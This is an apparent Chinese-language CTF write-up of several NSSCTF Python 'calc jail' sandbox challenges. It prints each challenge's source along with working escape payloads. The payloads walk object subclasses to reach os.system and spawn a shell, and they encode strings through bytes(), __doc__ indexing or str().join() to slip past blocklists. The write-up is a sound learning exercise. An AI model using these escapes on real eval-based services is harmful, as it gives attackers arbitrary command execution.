<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">MY_FLAG = <span class="string">&quot;NSSCTF&#123;fake_flag_in_local_but_really_in_The_remote&#125;&quot;</span></span><br><span class="line">BLACED_KLIST = <span class="string">&#x27;&quot;%&amp;\&#x27;,-/_:;@\\`&#123;|&#125;~*&lt;=&gt;[] \t\n\r&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_safe_check</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(<span class="built_in">ord</span>(m) &lt; <span class="number">0x7f</span> <span class="keyword">for</span> m <span class="keyword">in</span> n) <span class="keyword">and</span> <span class="built_in">all</span>(m <span class="keyword">not</span> <span class="keyword">in</span> n <span class="keyword">for</span> m <span class="keyword">in</span> BLACED_KLIST)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_safe_eval</span>(<span class="params">m, my_func</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> my_safe_check(m):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Hacker!!!!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="string">f&quot;<span class="subst">&#123;my_func.__name__&#125;</span>(<span class="subst">&#123;m&#125;</span>)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;my_func.__name__: my_func&#125;, <span class="string">&quot;flag&quot;</span>: MY_FLAG&#125;))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Try again!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    my_safe_eval(<span class="built_in">input</span>(<span class="string">&quot;Payload:&quot;</span>), <span class="built_in">type</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>简单了解一下python里的<code>all()</code>的用法：</p>
<p><code>all(Iterable)</code>在可迭代对象中如果每一个值都为True那么<code>all()</code>也返回布尔值True。</p>
<p>如果可迭代对象是空的那么也返回True。</p>
</blockquote>
<h4 id="calc-jail-beginner-level4">calc_jail_beginner_level4</h4>
<p>So cool that u finished the week1 challenge</p>
<p>No dangerous password no chr try to hack me!!!</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#No danger function,no chr,Try to hack me!!!!</span></span><br><span class="line"><span class="comment">#Try to read file ./flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>]</span><br><span class="line"></span><br><span class="line">eval_func = <span class="built_in">eval</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _   </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || |  </span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_ </span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |  </span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|  </span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                      </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                                                                             </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(eval_func(input_data)))</span><br></pre></td></tr></table></figure>
<p>看了一下被禁用的内容，不影响使用Show subclasses with tuple：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
<p>找到<code>&lt;class 'os._wrap_close'&gt;</code>在倒数第四个，拿出payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>注意这题还ban掉了单引号双引号反引号，将payload里的两个字符串改一下bytes型：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">bytes</span>([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode()](<span class="built_in">bytes</span>([<span class="number">115</span>, <span class="number">104</span>]).decode())</span><br></pre></td></tr></table></figure>
<blockquote>
<p>当然，方法总部困难多，如果bytes型这种也不让使用的话，还有一种比较巧妙的方法，就是从魔术方法的文档里去找字符然后进行拼接：</p>
<p><code>__doc__</code>魔术方法能从默认的类里找到相对应的文档，例如<code>().__doc__</code>就是tuple类的文档，输出：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Built-in immutable sequence.</span><br><span class="line"></span><br><span class="line">If no argument is given, the constructor returns an empty tuple.</span><br><span class="line">If iterable is specified the tuple is initialized from iterable&#x27;s items.</span><br><span class="line"></span><br><span class="line">If the argument is a tuple, the return value is the same object. </span><br></pre></td></tr></table></figure>
<p>返回了一段字符串文字，可以从里面找到我们需要的字母的偏移量，然后拿来用偏移量表示字符即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__doc__.find(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 19</span></span><br></pre></td></tr></table></figure>
<p>下次想使用字符<code>s</code>的时候，直接使用<code>().__doc__[19]</code>即可。只要我们选择的文档里面有足够多的字母，那么就可以得到想要的字母。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">86</span>]+().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">4</span>]+().__doc__[<span class="number">17</span>]+().__doc__[<span class="number">10</span>]](().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">56</span>])</span><br></pre></td></tr></table></figure>
</blockquote>
<p>事实上，通过ls发现flag文件就叫flag，在已知flag文件名字的前提下，可以直接使用<code>open('flag').read()</code>去改写，两种方法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>]).decode()).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># print([().__doc__.find(&#x27;f&#x27;),().__doc__.find(&#x27;l&#x27;),().__doc__.find(&#x27;a&#x27;),().__doc__.find(&#x27;g&#x27;)])</span></span><br><span class="line"><span class="built_in">open</span>(().__doc__[<span class="number">31</span>]+().__doc__[<span class="number">3</span>]+().__doc__[<span class="number">14</span>]+().__doc__[<span class="number">38</span>]).read()</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level4-0-5">calc_jail_beginner_level4.0.5</h4>
<p>So cool that u finished the week1 challenge Let’s 4.0.5</p>
<p>No dangerous password no chr try to hack me!!!</p>
<p>没有附件：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let&#x27;s have an beginner jail of calc</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br><span class="line">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,&quot;,&#x27; Good luck!</span><br></pre></td></tr></table></figure>
<p>尝试同样用上面的方法直接过了，获取一下源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#No danger function,no chr,Try to hack me!!!!</span></span><br><span class="line"><span class="comment">#Try to read file ./flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;locals&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>]</span><br><span class="line"></span><br><span class="line">my_eval_func_0002321 = <span class="built_in">eval</span></span><br><span class="line">my_input_func_2309121 = <span class="built_in">input</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _    ___   _____</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || |  / _ \ | ____|</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| | | || |__</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| | | ||___ \</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |_| | ___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)\___(_)____/</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals and `,\&quot;,&#x27; Good luck!&quot;</span>)</span><br><span class="line">input_data = my_input_func_2309121(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_eval_func_0002321(input_data)))</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level4-1">calc_jail_beginner_level4.1</h4>
<p>So cool that u finished the 4.0 challenge</p>
<p>but now u can read file</p>
<p>也没有附件：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let&#x27;s have an beginner jail of calc</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br><span class="line">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and `,&quot;,&#x27; Good luck!</span><br></pre></td></tr></table></figure>
<p>用level4的做法还是可以，注意这题已经把<code>bytes</code>给ban掉了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">86</span>]+().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">4</span>]+().__doc__[<span class="number">17</span>]+().__doc__[<span class="number">10</span>]](().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">56</span>])</span><br></pre></td></tr></table></figure>
<p>而且这题flag文件名字也改了，所以投机取巧的方法也不成功。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#No danger function,no chr,Try to hack me!!!!</span></span><br><span class="line"><span class="comment">#Try to read file ./flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;locals&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;bytes&#x27;</span>]</span><br><span class="line"></span><br><span class="line">my_eval_func_ABDC8732 = <span class="built_in">eval</span></span><br><span class="line">my_input_func_001EC9GP = <span class="built_in">input</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _  __</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || |/_ |</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| |</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)_|</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                        </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and `,\&quot;,&#x27; Good luck!&quot;</span>)</span><br><span class="line">input_data = my_input_func_001EC9GP(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_eval_func_ABDC8732(input_data)))</span><br></pre></td></tr></table></figure>
<p>如果bytes被删掉了，其实还可以利用Show subclasses with tuple找到<code>bytes</code>类：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
<p>找到里面的<code>&lt;class 'bytes'&gt;</code>，修改之前的payload，将payload改成Show subclasses with tuple表达的形式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode()](().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>, <span class="number">104</span>]).decode())</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level4-2">calc_jail_beginner_level4.2</h4>
<p>So cool that u finished the 4.1 challenge</p>
<p>filter + try again!!!</p>
<p>还是没有源码：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let&#x27;s have an beginner jail of calc</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br><span class="line">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,&quot;,&#x27;,+ Good luck!</span><br></pre></td></tr></table></figure>
<p>这题试了一下<code>__doc__</code>拼接的方法，并没有成功，测试了一下好像是<code>+</code>被拿下了，python还提供了一个<code>join()</code>方法用来连接字符串，之前也用过，所以直接拿来改payload：</p>
<blockquote>
<p><code>join()</code>常用的方法就是<code>''.join(['1','2','3','4']) == '1234'</code>，这里由于引号被ban了，可以直接使用<code>str().join()</code>来代替。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">86</span>],().__doc__[<span class="number">19</span>],().__doc__[<span class="number">4</span>],().__doc__[<span class="number">17</span>],().__doc__[<span class="number">10</span>]])](<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">56</span>]]))</span><br></pre></td></tr></table></figure>
<p>获取了源码发现确实是ban掉了加号：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#No danger function,no chr,Try to hack me!!!!</span></span><br><span class="line"><span class="comment">#Try to read file ./flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;locals&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;bytes&#x27;</span>]</span><br><span class="line"></span><br><span class="line">my_eval_func_00EFCDB = <span class="built_in">eval</span></span><br><span class="line">my_input_func_00FDCAB = <span class="built_in">input</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`+&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _   ___</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || | |__ \</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_   ) |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| / /</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ / /_</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____|</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,\&quot;,&#x27;,+ Good luck!&quot;</span>)</span><br><span class="line">input_data = my_input_func_00FDCAB(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_eval_func_00EFCDB(input_data)))</span><br></pre></td></tr></table></figure>
<p>事实上，这题也可以用4.1里的bytes那种方法，所以也可以这样：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode()](().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>, <span class="number">104</span>]).decode())</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level4-3">calc_jail_beginner_level4.3</h4>
<p>So cool that u finished the 4.1 challenge</p>
<p>filter +++ try again!!!</p>
<p>没有附件：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let&#x27;s have an beginner jail of calc</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br><span class="line">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and `,&quot;,&#x27;,+ Good luck!</span><br></pre></td></tr></table></figure>
<p>试试前几关的payload，首先是用bytes改写，成功：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode()](().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>, <span class="number">104</span>]).decode())</span><br></pre></td></tr></table></figure>
<p>看看源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;locals&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;bytes&#x27;</span>,<span class="string">&#x27;type&#x27;</span>,<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">my_eval_func_002EFCDB = <span class="built_in">eval</span></span><br><span class="line">my_input_func_000FDCAB = <span class="built_in">input</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`+&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _   ____</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || | |___ \</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_  __) |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _||__ &lt;</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ ___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____/</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and `,\&quot;,&#x27;,+ Good luck!&quot;</span>)</span><br><span class="line">    input_data = my_input_func_000FDCAB(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span 